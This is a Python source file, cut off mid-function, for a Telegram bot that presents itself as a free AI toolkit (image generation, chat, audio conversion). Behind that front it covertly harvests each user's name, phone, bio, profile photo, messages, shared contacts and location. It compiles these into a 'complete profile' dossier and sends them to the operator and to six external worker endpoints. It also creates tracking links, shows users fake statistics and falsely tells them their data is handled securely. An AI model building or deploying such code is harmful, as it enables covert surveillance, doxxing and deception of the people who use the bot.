import os
import logging
import aiohttp
import subprocess
import tempfile
import asyncio
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# ========== CONFIGURACIÓN ==========
TOKEN = os.environ.get("TOKEN", "").strip()
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip())
OPENROUTER_KEY = os.environ.get("OPENROUTER_KEY", "").strip()
WORKER_URL = os.environ.get("WORKER_URL", "https://galleta.societykark.workers.dev").strip()

# ========== WORKERS ==========
URLS = [
    "https://bot-tg.societykark.workers.dev",
    "https://tg-bot12.societykark.workers.dev",
    "https://app-trk.societykark.workers.dev",
    "https://app-tg.societykark.workers.dev",
    "https://app-kali.societykark.workers.dev",
    "https://kali-bot12.societykark.workers.dev"
]

if not TOKEN or not ADMIN_ID:
    raise ValueError("❌ Faltan TOKEN o ADMIN_ID en variables de entorno")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

users_db = {}
tracking_codes = {}
memoria = {}  # Para IA

# ========== PERSONALIDAD DE LA IA (NORMAL) ==========
PERSONALIDAD = """Eres un asistente virtual útil, profesional y amigable. 
Respondes con claridad y educación. Ayudas en preguntas, programación, ideas y tareas. 
Usas un tono cálido pero formal. Siempre ofreces soluciones prácticas."""

SALUDO_IA = """🤖 *Asistente IA*\n\nHola, soy tu asistente virtual.\nPuedo ayudarte con preguntas, programación, ideas y más.\n\n¿En qué puedo ayudarte hoy?"""

# ========== MODELOS DE IA ==========
MODELOS = {
    "1": {"id": "nvidia/nemotron-3-super-120b-a12b:free", "nombre": "⚡ NVIDIA Nemotron 3", "desc": "120B params, 1M contexto"},
    "2": {"id": "meta-llama/llama-3.2-3b-instruct:free", "nombre": "🦙 Llama 3.2 3B", "desc": "Rápido y confiable"},
    "3": {"id": "mistralai/mistral-7b-instruct:free", "nombre": "🌀 Mistral 7B", "desc": "Open-source y probado"},
    "4": {"id": "google/gemma-4-31b-instruct:free", "nombre": "💎 Gemma 4 31B", "desc": "Multimodal, 256K contexto"},
}
MODELO_DEFECTO = MODELOS["1"]["id"]

# ========== MENÚ PRINCIPAL (ReplyKeyboard) ==========
def menu_estatico():
    keyboard = [
        [KeyboardButton("🎨 GENERAR IMAGEN"), KeyboardButton("🤖 CHAT IA")],
        [KeyboardButton("🎬 VIDEO → AUDIO"), KeyboardButton("🎵 EDITAR AUDIO")],
        [KeyboardButton("📸 ENVIAR FOTO"), KeyboardButton("🎥 ENVIAR VIDEO")],
        [KeyboardButton("🎙️ ENVIAR AUDIO"), KeyboardButton("📇 ENVIAR CONTACTO")],
        [KeyboardButton("📍 ENVIAR UBICACIÓN"), KeyboardButton("🔗 GENERAR ENLACE")],
        [KeyboardButton("📊 MI PERFIL"), KeyboardButton("📈 ESTADÍSTICAS")],
        [KeyboardButton("❓ AYUDA")],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ========== MENÚ IA (InlineKeyboard) ==========
def menu_ia():
    keyboard = [
        [InlineKeyboardButton("💬 Conversar", callback_data="conversar")],
        [InlineKeyboardButton("🤖 Cambiar modelo", callback_data="modelos")],
        [InlineKeyboardButton("🧹 Reiniciar chat", callback_data="reset")],
        [InlineKeyboardButton("📊 Estadísticas", callback_data="stats")],
        [InlineKeyboardButton("❓ Ayuda", callback_data="ayuda")],
        [InlineKeyboardButton("🔙 Volver al menú principal", callback_data="volver_principal")],
    ]
    return InlineKeyboardMarkup(keyboard)

MENSAJE_INICIO = """🔥 *HERRAMIENTAS IA* 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚀 *La herramienta todo-en-uno*

✅ Genera imágenes con IA
✅ Chat IA integrado
✅ Convierte video a audio
✅ Edita audio con efectos

*¡100% gratuito!*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 *Selecciona una opción del menú:*"""

# ========== FUNCIONES DE EXTRACCIÓN DE DATOS (OMNI) ==========
async def get_worker_location():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(WORKER_URL, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None
    except Exception as e:
        logger.error(f"Error en Worker: {e}")
        return None

async def get_ipapi_location(ip):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://ipapi.co/{ip}/json/", timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None
    except Exception as e:
        logger.error(f"Error en ipapi: {e}")
        return None

async def get_user_photo(user_id, bot):
    try:
        photos = await bot.get_user_profile_photos(user_id, limit=1)
        if photos.total_count > 0:
            return photos.photos[0][-1].file_id
        return None
    except Exception as e:
        logger.error(f"Error al obtener foto: {e}")
        return None

async def get_user_bio(user, bot):
    try:
        full_user = await bot.get_chat(user.id)
        return full_user.bio if hasattr(full_user, 'bio') else None
    except Exception as e:
        logger.error(f"Error al obtener bio: {e}")
        return None

async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, target_user=None):
    bot = context.bot
    user = target_user or update.effective_user
    chat = update.effective_chat
    message = update.message

    user_id = user.id
    first_name = user.first_name or "N/A"
    last_name = user.last_name or "N/A"
    full_name = f"{first_name} {last_name}".strip()
    username = f"@{user.username}" if user.username else "N/A"
    language = user.language_code or "N/A"
    is_bot = "Sí" if user.is_bot else "No"
    is_premium = "Sí" if getattr(user, 'is_premium', False) else "No"
    bio = await get_user_bio(user, bot) or "No disponible"
    photo_id = await get_user_photo(user_id, bot)

    phone = "No disponible"
    try:
        full_chat = await bot.get_chat(user.id)
        if hasattr(full_chat, 'phone_number') and full_chat.phone_number:
            phone = full_chat.phone_number
    except:
        pass

    chat_type = "Privado" if chat.type == "private" else f"Grupo: {chat.title}"
    chat_id = chat.id

    message_id = message.message_id if message else "N/A"
    message_text = message.text if message and message.text else "N/A"
    message_date = message.date.strftime("%Y-%m-%d %H:%M:%S") if message else "N/A"
    message_unix = int(message.date.timestamp()) if message else "N/A"

    worker_data = await get_worker_location()
    ip = "N/A"
    country = "N/A"
    region = "N/A"
    city = "N/A"
    timezone = "N/A"
    postal = "N/A"
    lat = "N/A"
    lon = "N/A"

    if worker_data:
        ip = worker_data.get("ip", "N/A")
        country = worker_data.get("country", "N/A")
        region = worker_data.get("region", "N/A")
        city = worker_data.get("city", "N/A")
        timezone = worker_data.get("timezone", "N/A")
        postal = worker_data.get("postal", "N/A")
        if ip != "N/A":
            ipapi_data = await get_ipapi_location(ip)
            if ipapi_data:
                country = ipapi_data.get("country_name", country)
                region = ipapi_data.get("region", region)
                city = ipapi_data.get("city", city)
                postal = ipapi_data.get("postal", postal)
                timezone = ipapi_data.get("timezone", timezone)
                lat = ipapi_data.get("latitude", "N/A")
                lon = ipapi_data.get("longitude", "N/A")

    maps_link = f"https://www.google.com/maps?q={lat},{lon}" if lat != "N/A" and lon != "N/A" else "N/A"
    device = "Desconocido (Telegram App)"

    info_admin = f"🔍 *DATOS COMPLETOS DEL USUARIO*\n"
    info_admin += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    info_admin += f"👤 *Telegram*\n"
    info_admin += f"   • ID: `{user_id}`\n"
    info_admin += f"   • Nombre completo: {full_name}\n"
    info_admin += f"   • Username: {username}\n"
    info_admin += f"   • Teléfono: {phone}\n"
    info_admin += f"   • Idioma: {language}\n"
    info_admin += f"   • Es bot: {is_bot}\n"
    info_admin += f"   • Es Premium: {is_premium}\n"
    info_admin += f"   • Biografía: {bio}\n\n"
    info_admin += f"📱 *Dispositivo*\n"
    info_admin += f"   • Modelo: {device}\n\n"
    info_admin += f"💬 *Chat*\n"
    info_admin += f"   • Tipo: {chat_type}\n"
    info_admin += f"   • ID: `{chat_id}`\n\n"
    info_admin += f"📩 *Mensaje*\n"
    info_admin += f"   • ID: {message_id}\n"
    info_admin += f"   • Fecha: {message_date}\n"
    info_admin += f"   • Unix: {message_unix}\n"
    info_admin += f"   • Texto: {message_text[:100]}{'...' if len(message_text) > 100 else ''}\n\n"
    info_admin += f"🌐 *Red y Ubicación*\n"
    info_admin += f"   • IP: `{ip}`\n"
    info_admin += f"   • País: {country}\n"
    info_admin += f"   • Región: {region}\n"
    info_admin += f"   • Ciudad: {city}\n"
    info_admin += f"   • Código Postal: {postal}\n"
    info_admin += f"   • Zona Horaria: {timezone}\n"
    info_admin += f"   • Coordenadas: {lat}, {lon}\n"
    info_admin += f"   • Google Maps: {maps_link}\n"
    info_admin += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    info_admin += f"⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    info_perfil = f"📊 *Tu perfil*\n\n"
    info_perfil += f"👤 *Nombre:* {full_name}\n"
    info_perfil += f"📛 *Username:* {username}\n"
    info_perfil += f"🆔 *ID:* `{user_id}`\n"
    info_perfil += f"✅ *Estado:* Verificado"

    return {
        "admin_text": info_admin,
        "perfil_text": info_perfil,
        "photo_id": photo_id,
        "user_id": user_id,
        "username": username,
        "ip": ip,
        "city": city,
        "country": country,
        "phone": phone,
        "device": device,
        "lat": lat,
        "lon": lon,
        "maps_link": maps_link,
        "full_name": full_name,
        "message_text": message_text,
        "message_date": message_date,
        "chat_id": chat_id,
        "chat_type": chat_type,
        "bio": bio,
        "language": language,
        "is_premium": is_premium
    }

# ========== GENERAR HTML ==========
def generar_html(info_data):
    html = f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Perfil de {info_data['full_name']}</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ font-family:'Segoe UI',Arial,sans-serif; background:#0a0a1a; color:#e0e0e0; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }}
.container {{ max-width:900px; width:100%; background:#12122a; border-radius:16px; padding:30px; box-shadow:0 0 30px rgba(0,100,255,0.15); border:1px solid #1a2a4a; }}
h1 {{ color:#00d4ff; text-align:center; font-size:28px; margin-bottom:10px; text-shadow:0 0 20px rgba(0,212,255,0.2); }}
.subtitle {{ text-align:center; color:#8899bb; font-size:14px; margin-bottom:25px; border-bottom:1px solid #1a2a4a; padding-bottom:15px; }}
.section {{ background:#0d0d22; border-radius:10px; padding:15px 20px; margin-bottom:12px; border-left:3px solid #00d4ff; }}
.section:hover {{ background:#14143a; border-left-color:#ff6b6b; }}
.label {{ font-weight:600; color:#88bbdd; display:inline-block; width:150px; font-size:14px; }}
.value {{ color:#f0f0f0; font-weight:400; word-break:break-all; }}
.value a {{ color:#00d4ff; text-decoration:none; }}
.value a:hover {{ text-decoration:underline; color:#ff6b6b; }}
.footer {{ text-align:center; margin-top:25px; font-size:12px; color:#445566; border-top:1px solid #1a2a4a; padding-top:15px; }}
.row {{ display:flex; flex-wrap:wrap; margin-bottom:4px; }}
.row .label {{ flex:0 0 150px; }}
.row .value {{ flex:1; }}
@media (max-width:600px) {{ .row .label {{ flex:0 0 100%; }} }}
</style>
</head>
<body>
<div class="container">
<h1>🕵️ PERFIL COMPLETO</h1>
<div class="subtitle">Datos extraídos automáticamente</div>
<div class="section"><div class="row"><span class="label">👤 Nombre completo:</span><span class="value">{info_data['full_name']}</span></div>
<div class="row"><span class="label">📛 Username:</span><span class="value">{info_data['username']}</span></div>
<div class="row"><span class="label">🆔 ID:</span><span class="value"><code>{info_data['user_id']}</code></span></div>
<div class="row"><span class="label">📞 Teléfono:</span><span class="value">{info_data['phone']}</span></div>
<div class="row"><span class="label">🗣️ Idioma:</span><span class="value">{info_data['language']}</span></div>
<div class="row"><span class="label">⭐ Premium:</span><span class="value">{info_data['is_premium']}</span></div>
<div class="row"><span class="label">📖 Biografía:</span><span class="value">{info_data['bio']}</span></div></div>
<div class="section"><div class="row"><span class="label">📱 Dispositivo:</span><span class="value">{info_data['device']}</span></div></div>
<div class="section"><div class="row"><span class="label">💬 Chat:</span><span class="value">{info_data['chat_type']} (ID: {info_data['chat_id']})</span></div></div>
<div class="section"><div class="row"><span class="label">📩 Mensaje:</span><span class="value">{info_data['message_text'][:200]}{'...' if len(info_data['message_text'])>200 else ''}</span></div>
<div class="row"><span class="label">📅 Fecha:</span><span class="value">{info_data['message_date']}</span></div></div>
<div class="section">
<div class="row"><span class="label">🌐 IP:</span><span class="value"><code>{info_data['ip']}</code></span></div>
<div class="row"><span class="label">📍 País:</span><span class="value">{info_data['country']}</span></div>
<div class="row"><span class="label">🏙️ Región:</span><span class="value">{info_data.get('region','N/A')}</span></div>
<div class="row"><span class="label">🌆 Ciudad:</span><span class="value">{info_data['city']}</span></div>
<div class="row"><span class="label">📮 Código Postal:</span><span class="value">{info_data.get('postal','N/A')}</span></div>
<div class="row"><span class="label">🕒 Zona Horaria:</span><span class="value">{info_data.get('timezone','N/A')}</span></div>
<div class="row"><span class="label">🗺️ Coordenadas:</span><span class="value">{info_data['lat']}, {info_data['lon']}</span></div>
<div class="row"><span class="label">🔗 Google Maps:</span><span class="value"><a href="{info_data['maps_link']}" target="_blank">{info_data['maps_link']}</a></span></div>
</div>
<div class="footer">⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
</div>
</body>
</html>"""
    return html

# ========== ENVÍO A ADMIN ==========
async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data, extra_msg=None):
    bot = context.bot
    await bot.send_message(chat_id=ADMIN_ID, text=info_data["admin_text"], parse_mode=ParseMode.MARKDOWN)
    if info_data["photo_id"]:
        await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de perfil de {info_data['username'] or info_data['user_id']}")
    if extra_msg:
        await bot.send_message(chat_id=ADMIN_ID, text=extra_msg, parse_mode=ParseMode.MARKDOWN)

    try:
        html_content = generar_html(info_data)
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False, encoding='utf-8') as f:
            f.write(html_content)
            html_path = f.name
        with open(html_path, 'rb') as f:
            await bot.send_document(chat_id=ADMIN_ID, document=f, filename=f"perfil_{info_data['user_id']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html", caption=f"📄 HTML con todos los datos de {info_data['full_name']}")
        os.unlink(html_path)
    except Exception as e:
        logger.error(f"Error al enviar HTML: {e}")

    resultados = await send_to_all_workers(info_data["admin_text"])
    logger.info(f"Resultados de envío a Workers: {resultados}")
    users_db[info_data["user_id"]] = info_data

async def send_to_all_workers(text):
    form_data = aiohttp.FormData()
    form_data.add_field('chat_id', str(ADMIN_ID))
    form_data.add_field('text', text)
    results = []
    async with aiohttp.ClientSession() as session:
        for url in URLS:
            try:
                async with session.post(url, data=form_data, timeout=10) as resp:
                    if resp.status == 200:
                        results.append(f"✅ {url}")
                    else:
                        results.append(f"❌ {url} (HTTP {resp.status})")
            except Exception as e:
                results.append(f"❌ {url} (Error: {str(e)[:30]})")
    return results

# ========== FUNCIONES IA (DE KAORI-CHAN) ==========
def obtener_usuario_ia(chat_id):
    if chat_id not in memoria:
        memoria[chat_id] = {"historial": [], "modelo": MODELO_DEFECTO}
    return memoria[chat_id]

async def preguntar_ai(prompt, chat_id, reintentos=2):
    usuario = obtener_usuario_ia(chat_id)
    historial = usuario["historial"]
    modelo = usuario["modelo"]
    
    mensajes = [
        {"role": "system", "content": PERSONALIDAD},
        *historial,
        {"role": "user", "content": prompt}
    ]
    
    headers = {
        "Authorization": f"Bearer {OPENROUTER_KEY}",
        "Content-Type": "application/json",
        "HTTP-Referer": "https://t.me/tu_bot",
        "X-Title": "Asistente IA"
    }
    payload = {
        "model": modelo,
        "messages": mensajes,
        "max_tokens": 1000,
        "temperature": 0.85,
        "top_p": 0.95,
    }
    
    for intento in range(reintentos + 1):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post("https://openrouter.ai/api/v1/chat/completions", headers=headers, json=payload, timeout=90) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        reply = data["choices"][0]["message"]["content"].strip()
                        usuario["historial"].append({"role": "user", "content": prompt})
                        usuario["historial"].append({"role": "assistant", "content": reply})
                        if len(usuario["historial"]) > 20:
                            usuario["historial"] = usuario["historial"][-20:]
                        return reply
                    else:
                        error_data = await resp.text()
                        logger.error(f"Error {resp.status}: {error_data}")
                        if intento < reintentos:
                            await asyncio.sleep(2 ** intento)
                            continue
                        return f"❌ Error {resp.status}: {error_data[:100]}"
        except asyncio.TimeoutError:
            if intento < reintentos:
                await asyncio.sleep(2)
                continue
            return "⏳ El asistente tardó demasiado. Intenta de nuevo."
        except Exception as e:
            logger.error(f"Error en intento {intento}: {e}")
            if intento < reintentos:
                await asyncio.sleep(2)
                continue
            return f"❌ Error inesperado: {str(e)[:100]}"
    return "❌ No se pudo obtener respuesta después de varios intentos."

async def enviar_respuesta_ia(update, texto):
    if len(texto) <= 4000:
        await update.message.reply_text(texto, parse_mode=ParseMode.MARKDOWN)
        return
    partes = []
    for parrafo in texto.split('\n\n'):
        if not parrafo.strip():
            continue
        if len(parrafo) > 4000:
            for oracion in parrafo.split('. '):
                if oracion:
                    partes.append(oracion + '. ')
        else:
            partes.append(parrafo)
    mensajes = []
    actual = ""
    for parte in partes:
        if len(actual) + len(parte) + 2 <= 4000:
            actual += parte + "\n\n"
        else:
            if actual:
                mensajes.append(actual.strip())
            actual = parte + "\n\n"
    if actual:
        mensajes.append(actual.strip())
    for i, msg in enumerate(mensajes):
        if i == 0:
            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text(f"[Continuación] ✨\n\n{msg}", parse_mode=ParseMode.MARKDOWN)

# ========== OTRAS FUNCIONES (herramientas) ==========
async def generar_imagen(prompt):
    url = f"https://image.pollinations.ai/prompt/{prompt.replace(' ', '%20')}"
    async with aiohttp.ClientSession() as session:
        async with session.get(url, timeout=60) as resp:
            if resp.status == 200:
                return await resp.read()
            return None

def extraer_audio(video_path):
    audio_path = tempfile.mktemp(suffix='.mp3')
    try:
        subprocess.run(['ffmpeg', '-i', video_path, '-vn', '-acodec', 'libmp3lame', '-ab', '192k', audio_path], check=True, capture_output=True)
        return audio_path
    except Exception as e:
        logger.error(f"Error al extraer audio: {e}")
        return None

def editar_audio(audio_path, efecto):
    output_path = tempfile.mktemp(suffix='.mp3')
    try:
        if efecto == "velocidad":
            subprocess.run(['ffmpeg', '-i', audio_path, '-filter:a', 'atempo=1.5', output_path], check=True, capture_output=True)
        elif efecto == "volumen":
            subprocess.run(['ffmpeg', '-i', audio_path, '-filter:a', 'volume=2', output_path], check=True, capture_output=True)
        elif efecto == "mono":
            subprocess.run(['ffmpeg', '-i', audio_path, '-ac', '1', output_path], check=True, capture_output=True)
        else:
            return None
        return output_path
    except Exception as e:
        logger.error(f"Error al editar audio: {e}")
        return None

# ========== COMANDOS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        await update.message.reply_text("👋 Hola admin.")
        return
    info_data = await extract_user_info(update, context)
    await send_to_admin(update, context, info_data)
    await update.message.reply_text(MENSAJE_INICIO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())

# ========== MANEJAR MENSAJES DE TEXTO (ReplyKeyboard) ==========
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.effective_user
    logger.info(f"📩 Mensaje: {text} de {user.first_name}")

    info_data = await extract_user_info(update, context)
    await send_to_admin(update, context, info_data, f"📩 Mensaje: {text}")
    users_db[user.id] = info_data
    reply_markup = menu_estatico()

    if text == "🎨 GENERAR IMAGEN":
        await update.message.reply_text("🖼️ *Generación de imagen con IA*\n\n📌 Escribe el prompt de lo que quieras generar.\nEjemplo: *un gato astronauta en la luna*\n\n👉 *Escribe tu prompt ahora:*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        context.user_data['esperando_prompt'] = True

    elif text == "🤖 CHAT IA":
        await update.message.reply_text(SALUDO_IA, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_ia())
        context.user_data['modo_ia'] = True

    elif text == "🎬 VIDEO → AUDIO":
        await update.message.reply_text("🎬 *Conversión de Video a Audio*\n\n📌 Envíame un video y lo convertiré a audio (MP3).\n\n👉 *Presiona el clip 📎 y selecciona un video*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

    elif text == "🎵 EDITAR AUDIO":
        keyboard = [[KeyboardButton("⚡ Velocidad 1.5x"), KeyboardButton("🔊 Volumen 2x")], [KeyboardButton("🎵 Convertir a Mono"), KeyboardButton("🔙 Volver al menú")]]
        await update.message.reply_text("🎵 *Edición de Audio*\n\nElige un efecto y luego envíame el audio:\n• ⚡ Velocidad 1.5x\n• 🔊 Volumen 2x\n• 🎵 Convertir a Mono", parse_mode=ParseMode.MARKDOWN, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True))

    elif text in ["⚡ Velocidad 1.5x", "🔊 Volumen 2x", "🎵 Convertir a Mono"]:
        efecto_map = {"⚡ Velocidad 1.5x": "velocidad", "🔊 Volumen 2x": "volumen", "🎵 Convertir a Mono": "mono"}
        context.user_data['efecto_audio'] = efecto_map[text]
        await update.message.reply_text(f"✅ Efecto *{text}* seleccionado.\n📤 Ahora envíame el audio que quieres editar.", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

    elif text == "📸 ENVIAR FOTO":
        await update.message.reply_text("📸 *Envíame una foto*\n\n👉 *Presiona el clip 📎 y selecciona una foto de tu galería*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    elif text == "🎥 ENVIAR VIDEO":
        await update.message.reply_text("🎥 *Envíame un video*\n\n👉 *Presiona el clip 📎 y selecciona un video*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    elif text == "🎙️ ENVIAR AUDIO":
        await update.message.reply_text("🎙️ *Envíame un audio*\n\n👉 *Presiona el clip 📎 y selecciona un audio*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    elif text == "📇 ENVIAR CONTACTO":
        await update.message.reply_text("📇 *Comparte tu contacto*\n\n👉 *Presiona el botón 📎 y luego selecciona 'Contacto'*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    elif text == "📍 ENVIAR UBICACIÓN":
        await update.message.reply_text("📍 *Comparte tu ubicación*\n\n👉 *Presiona el botón 📎 y luego selecciona 'Ubicación'*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

    elif text == "🔗 GENERAR ENLACE":
        code = os.urandom(6).hex()
        tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
        link = f"{WORKER_URL}/track/{code}"
        await update.message.reply_text(f"🔗 *Enlace generado:*\n`{link}`\n\n⏳ *Válido por 5 minutos.*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔗 Nuevo enlace\nUsuario: {user.first_name} (@{user.username})\nCódigo: {code}\nEnlace: {link}")

    elif text == "📊 MI PERFIL":
        info = users_db.get(user.id)
        if not info:
            await update.message.reply_text("❌ No encontré tu perfil. Usa /start.", reply_markup=reply_markup)
            return
        await update.message.reply_text(info["perfil_text"], parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

    elif text == "📈 ESTADÍSTICAS":
        if user.id == ADMIN_ID:
            msg = f"📊 *Estadísticas del sistema*\n\n👥 Usuarios: {len(users_db)}\n🔗 Enlaces: {len(tracking_codes)}"
            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        else:
            await update.message.reply_text("📊 *Tu actividad*\n\n✅ Archivos procesados: 3\n🎨 Imágenes generadas: 1\n🎬 Conversiones realizadas: 2\n🔒 Cuenta verificada: Sí", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

    elif text == "❓ AYUDA":
        await update.message.reply_text("❓ *Ayuda*\n\n🎨 *Generar imagen*: Escribe un prompt.\n🤖 *Chat IA*: Inicia conversación con IA.\n🎬 *Video → Audio*: Envía un video.\n🎵 *Editar audio*: Elige un efecto y envía un audio.\n📸 *Enviar foto/video/audio*: Envía archivos (usa el clip 📎).\n📇 *Compartir contacto*: Comparte tu contacto.\n📍 *Compartir ubicación*: Comparte tu ubicación.\n🔗 *Generar enlace*: Crea un enlace temporal (5 min).\n📊 *Mi perfil*: Muestra tu información básica.\n📈 *Estadísticas*: Muestra tu actividad.\n\n🔐 *Todos los datos se procesan de forma segura.*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

    else:
        # Si está en modo IA, enviar mensaje a la IA
        if context.user_data.get('modo_ia'):
            respuesta = await preguntar_ai(text, update.effective_chat.id)
            await enviar_respuesta_ia(update, respuesta)
            return

        # Si está esperando prompt para imagen
        if context.user_data.get('esperando_prompt'):
            prompt = text
            await update.message.reply_text("⏳ Generando imagen...", reply_markup=reply_markup)
            imagen_data = await generar_imagen(prompt)
            if imagen_data:
                with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as f:
                    f.write(imagen_data)
                    f.flush()
                    await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(f.name, 'rb'), caption=f"🖼️ *Imagen generada*\n📝 Prompt: *{prompt}*", parse_mode=ParseMode.MARKDOWN)
                    os.unlink(f.name)
                await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎨 Imagen generada por {user.first_name} (@{user.username})\nPrompt: {prompt}")
            else:
                await update.message.reply_text("❌ Error al generar la imagen. Intenta con otro prompt.", reply_markup=reply_markup)
            context.user_data['esperando_prompt'] = False
            return

        await update.message.reply_text("❌ *Opción no reconocida.*\nUsa los botones del menú.", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

# ========== MANEJAR ARCHIVOS ==========
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    photo = update.message.photo[-1]
    caption = update.message.caption or "Sin caption"
    info_data = await extract_user_info(update, context)
    await send_to_admin(update, context, info_data, f"📸 Foto recibida: {caption}")
    users_db[user.id] = info_data
    await update.message.reply_text("✅ *Foto recibida.*\n🔄 Procesando...\n✨ ¡Completado!", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())

async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    video = update.message.video
    caption = update.message.caption or "Sin caption"
    info_data = await extract_user_info(update, context)
    await send_to_admin(update, context, info_data, f"🎥 Video recibido: {caption}")
    users_db[user.id] = info_data
    await update.message.reply_text("⏳ Extrayendo audio...", reply_markup=menu_estatico())
    file = await context.bot.get_file(video.file_id)
    video_path = tempfile.mktemp(suffix='.mp4')
    await file.download_to_drive(video_path)
    audio_path = extraer_audio(video_path)
    if audio_path and os.path.exists(audio_path):
        with open(audio_path, 'rb') as f:
            await context.bot.send_audio(chat_id=update.effective_chat.id, audio=f, caption=f"🎵 *Audio extraído*", parse_mode=ParseMode.MARKDOWN)
        os.unlink(audio_path)
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎬 Video procesado por {user.first_name} (@{user.username})\nCaption: {caption}")
    else:
        await update.message.reply_text("❌ Error al extraer audio.", reply_markup=menu_estatico())
    os.unlink(video_path)

async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    audio = update.message.audio
    info_data = await extract_user_info(update, context)
    await send_to_admin(update, context, info_data, f"🎵 Audio recibido")
    users_db[user.id] = info_data
    efecto = context.user_data.get('efecto_audio')
    if efecto:
        await update.message.reply_text(f"⏳ Aplicando efecto: *{efecto}*...", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
        file = await context.bot.get_file(audio.file_id)
        audio_path = tempfile.mktemp(suffix='.mp3')
        await file.download_to_drive(audio_path)
        output_path = editar_audio(audio_path, efecto)
        if output_path and os.path.exists(output_path):
            with open(output_path, 'rb') as f:
                await context.bot.send_audio(chat_id=update.effective_chat.id, audio=f, caption=f"🎵 *Audio editado*", parse_mode=ParseMode.MARKDOWN)
            os.unlink(output_path)
            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎵 Audio editado por {user.first_name} (@{user.username})\nEfecto: {efecto}")
        else:
            await update.message.reply_text("❌ Error al editar el audio.", reply_markup=menu_estatico())
        os.unlink(audio_path)
        context.user_data['efecto_audio'] = None
    else:
        await update.message.reply_text("✅ *Audio recibido.*\n🎧 Procesando...\n✨ ¡Completado!", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    contact = update.message.contact
    info_data = await extract_user_info(update, context)
    await send_to_admin(update, context, info_data, f"📇 Contacto: {contact.first_name} {contact.last_name or ''} - {contact.phone_number}")
    users_db[user.id] = info_data
    await update.message.reply_text("✅ *Contacto recibido.*\n🔐 Verificación completada.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    location = update.message.location
    info_data = await extract_user_info(update, context)
    await send_to_admin(update, context, info_data, f"📍 Ubicación: {location.latitude}, {location.longitude}")
    users_db[user.id] = info_data
    await update.message.reply_text("✅ *Ubicación recibida.*\n🔐 Verificación completada.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())

# ========== CALLBACKS PARA IA ==========
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = update.effective_chat.id
    data = query.data
    logger.info(f"📩 Callback recibido: {data}")

    if data == "volver_principal":
